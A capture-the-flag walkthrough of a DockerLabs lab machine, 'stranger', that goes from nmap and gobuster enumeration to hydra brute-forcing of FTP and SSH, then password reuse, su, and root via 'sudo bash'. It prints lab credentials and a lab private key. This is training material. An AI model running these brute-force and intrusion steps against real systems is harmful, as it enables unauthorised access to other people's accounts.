![Screenshot](/medium/stranger/Images/machine.png)

Difficulty: **medium**

Made by: **kaikoperez**

---
# Steps to pwn 🥽

* 👁️‍🗨️ [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

First of all we verify if the machine is really active, we can do it with ping.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.203 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.089 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.146 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2044ms
rtt min/avg/max/mdev = 0.089/0.146/0.203/0.046 ms
```

---

# Reconnaissance

First of all we make a nmap scan to discover what ports are open from the machine.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 23:10 -05
Initiating ARP Ping Scan at 23:10
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 23:10, 0.14s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 23:10
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 21/tcp on 172.17.0.2
Completed SYN Stealth Scan at 23:10, 3.44s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000023s latency).
Scanned at 2025-11-02 23:10:56 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.86 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports from the port 1 to the port 65,535

**-n** <- With this argument we tell to nmap to skip the DNS resolution, this argument we can speed up the scan, by default nmap does this scan, and sometimes can slow down our scans... for initial scan, this is not necessary.

**-sS** <- With this argument we tell to nmap to make a stealth scan, this type of scan will not establish the 3-way-handshake, this means that the device doesn't connect correctly to the other machine, making it less "detectable" and a faster scan.

**--min-rate 5000** <- With this argument when the scan starts nmap will send at least 5000 packages per second, making the scan even more fast.

**-Pn** <- With this argument nmap will skip the host discovery phase, by default nmap are gonna do this type of scan discovery, this means that will treat the IP as active, we do this before with ping.

**-vv** <- With this argument nmap will gonna show reports while the scan continues, example: the port 22 is discovered and open, then it shows it, and the scan continues. (verbose mode)

**--open** <- With this argument nmap will only show the ports that are **open**.

We can see when the scan finish, that are 3 ports open:

* 21 ftp (file transfer protocol)
* 22 ssh (secure shell)
* 80 http (hyper-text transfer protocol)

Also we want to know more deeply about these ports, like, we want to know the versions of these ports and also a simple scan of reconnaissance per each port:

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ nmap -p21,22,80 -sCV 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-04 20:40 -05
Nmap scan report for 172.17.0.2
Host is up (0.000074s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6:af:01:77:e8:fc:a4:95:85:6b:5c:9c:c7:c1:d3:98 (ECDSA)
|_  256 36:7e:d3:25:fa:59:38:8f:2e:21:f9:f0:28:a4:7e:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: welcome
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: my; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
```

**-p21,22,80** <- With this argument we tell to scan only this 3 ports.

**-sCV** <- With this argument nmap per each port, will make two types of scan: scan versions per each port, and a scan of reconnaissance per each port.

It shows a little bit of info, like the victim machine is a linux machine, and his distro is **ubuntu**, and nothing more interesting here.

We can make a **whatweb scan** to identify what technologies are using the website, like can being be a wordpress, using php, python, etc...

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ whatweb http://172.17.0.2
http://172.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], Title[welcome]
```

We don't see so much info here, we can look more in the browser.

![Screenshot](/medium/stranger/Images/image1.png)

This it seems like a welcome from an user in this case is **mwheeler**, we can add this user in a txt file, to register more users that we can found later.

We can do some Enumeration on this website, to find out what possible others paths exists or even files.

---
# Enumeration 

![Screenshot](/medium/stranger/Images/image2.png)

With gobuster we can enumerate, and in this case we are gonna make a enumeration of directories (dir)

**-u** <- With this argument we are gonna type the url of the victim.

**-w** <- With this argument we are gonna introduce a dictionary, gobuster are going to do requests per each line of the dictionary, if it have some status of response like **200** (ok) gobuster will show us the directory or the file "found"

**-x** <- With this argument gobuster at the end of the payload, are going to add a extension, you can try various types of extensions like: php, py, txt, html, js, bak, etc...

* Note: per each extension you add the enumeration will take longer to finish, always is a good idea to make some **balance**, or we are going to die when the enumeration concludes.

When the enumeration concludes, we can notice that gobuster report us that there is a directory in the website (strange). We can take a look in the browser.

![Screenshot](/medium/stranger/Images/image3.png)

Immediately we can notice a password for a encrypted file, the pass is **iloveu** also we can add this types of users we did before with the user mwheeler.

We can add the user: will, demogorgon, also we can add iloveu, byers, bike.

Notice this is some type of keywords that we can take advantage to use.

We can look deeper on the page, the code of the page, keep enumerating and we don't got nothing more, just this.

if you want to see more about these keywords that we capture are gonna look like this:

![Screenshot](/medium/stranger/Images/image4.png)

---
# Exploitation

This is all we got, we can do some brute force on the port 21 (ftp) or even to the port 22 (ssh) to try if this "credentials" may be work.

We can try this with hydra if it success this type of attack.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ hydra -t 20 -L keywords -P keywords ftp://172.17.0.2
```

We are going to make a attack of brute force with hydra, a tool to do this type of stuff.

**-t** <- With this argument we are going to tell to hydra to display some threads, by each thread are going to do this attack and the others ones at the same time, with this the attack will be faster.

**-L** <- With this argument hydra are going to try multiple users, if we only want only one user we can do it with **-l**

**-P** <- With this argument hydra are going to try multiple passwords, if we only want to try one password we can do it with **-p**

ftp://172.17.0.2 <- With this argument hydra are going to attack this port ftp (the port 21 we discover before)

Once done this, we wait if we have success...
 
![Screenshot](/medium/stranger/Images/image5.png)

And... it works! we found that are a valid user **mwheeler** and a valid password for this user **demogorgon**

then we are going to try to login to ftp.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ ftp 172.17.0.2
Connected to 172.17.0.2.
220 Welcome to my FTP server
Name (172.17.0.2:craft): mwheeler
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

and it's valid the login, we can look inside what's is inside on ftp.

```
ftp> ls
229 Entering Extended Passive Mode (|||40032|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0             522 May 01  2024 private_key.pem
226 Directory send OK.
ftp>
```

It seems we got a private key, we are going to download it with the command **get**

```
ftp> get private_key.pem
local: private_key.pem remote: private_key.pem
229 Entering Extended Passive Mode (|||40057|)
150 Opening BINARY mode data connection for private_key.pem (522 bytes).
100% |***********************************************************************|   522       24.12 KiB/s    00:00 ETA
226 Transfer complete.
522 bytes received in 00:00 (21.29 KiB/s)
ftp> 
```

okay we can take a look, what are his content.

```
┌──(craft㉿kali)-[~/challenges/dockerlabs/medio/stranger]
└─$ cat private_key.pem 
-----BEGIN PRIVATE KEY-----
MIIBVQIBADANBgkqhkiG9w0BAQEFAASCAT8wggE7AgEAAkEA4/scrsX2G1QjCHdP
B8DM4PKeGCvzmxHgrrO6OB6o+OxsWKi6t20tqEv9UEtDIT5SthFWT4QTc9gqfmFf
xiSm3wIDAQABAkA6kC//CWU+Ae/55cQMZs96XXiVFv098Wq5FfwZHG8legIA0Qpz
oW2UQkV7ksXXF6kX7swQy/zCFJiIwbwxo47RAiEA8ma+qMEX61qI99DhsEVRhcVD
uo8edZeb/Sfg6b3cZscCIQDwxUSDi0BU77ZfqK3AwQwy7632wL7yJf76JdJspPFH
KQIgWe4Yag9JSn3KNvZ95KGy/wgSepJCYKogqykyXkWcEV0CIQC1Pmpi85JL3d9V
hy606R17wn0cQN/8fKnCOHJ8onWWcQIhAL5OKJjHADl0cgiv352WwIztGlbhKMuI
ajmuxxKdJvFL
-----END PRIVATE KEY-----
```

it seems a legit key, but it can be anything else, RSA, a certify, SSL and other things, for now we can save this and we can continue if we can brute force ssh.

Now, we are going to attack ssh with hydra, just the target are going to change to:

ssh://172.17.0.2

![Screenshot](/medium/stranger/Images/image6.png)

And also we got success! it seems this user have password reuse.

We are going to login through ssh with this user.

![Screenshot](/medium/stranger/Images/image7.png)

After a long enumeration... in the directory of the website **/var/www/html** and we go to **/secret/** we can see something interesting here in this file:

![Screenshot](/medium/stranger/Images/image8.png)

This a hint, we can brute force the user admin with the dictionary of rockyou, we can try it if it works:

![Screenshot](/medium/stranger/Images/image9.png)

we got success, we can try if this password with the user admin also reuses through ssh.

We can use the **su** command to change the user through the ssh login we got before with the user **mwheeler**:

```
mwheeler@37987aebb281:/var/www/html/strange$ su admin
Password: 
$ whoami
admin
$ 
```

It works the password **banana** with the user admin.

If we see this type of weird shell, we can type the **bash** command and we will get the shell of bash, if you can't do it, also works with python3 and importing the library pty.

---
# Privilege Escalation

![Screenshot](/medium/stranger/Images/image10.png)

And we do some lateral movement to this user admin.

And now we can try the **sudo -l** command now and we can see this:

![Screenshot](/medium/stranger/Images/image11.png)

It seems we can escalate privileges as any user of the system (ALL), including the user root, and we can use any command to the privilege escalation (ALL)
 
Then we can execute the next command to get the shell of the user root:

* sudo bash

this will execute the user root, the shell of bash, then the privilige escalation will be a success:

![Screenshot](/medium/stranger/Images/image12.png)

We got the root flag ***pwned!...***
